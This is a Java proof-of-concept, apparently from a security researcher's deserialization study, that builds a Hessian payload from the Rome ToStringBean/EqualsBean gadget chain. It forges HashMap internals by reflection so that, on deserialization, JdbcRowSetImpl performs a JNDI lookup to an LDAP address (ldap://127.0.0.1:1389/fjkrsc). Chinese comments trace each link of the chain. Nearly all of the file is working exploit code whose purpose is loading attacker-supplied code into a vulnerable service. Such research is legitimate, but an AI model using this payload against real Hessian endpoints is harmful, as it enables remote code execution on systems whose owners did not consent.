package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/11 5:07 下午
 */
public class RomeGadget {

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object JDBCInject() throws Exception {

        // 反序列化时 ToStringBean.toString 会被调用, 触发 JdbcRowSetImpl.getDatabaseMetaData -> JdbcRowSetImpl.connect -> Context.lookup.
        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(jndiUrl);
        jdbcRowSet.setMatchColumn("foo");
        return  jdbcRowSet;
    }

    public static void main(String[] args ) throws Exception {

        // 反序列化时 EqualsBean.beanHashCode 会被调用, 触发 ToStringBean.toString.
        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, JDBCInject());

        // 反序列化时 HashMap.hash 会被调用, 触发 EqualsBean.hashCode -> EqualsBean.beanHashCode.
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        // HashMap.put -> HashMap.putVal -> HashMap.hash
        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, equalsBean, equalsBean, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, equalsBean, equalsBean, null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian 序列化数据
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));

        // Hessian 反序列化数据
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
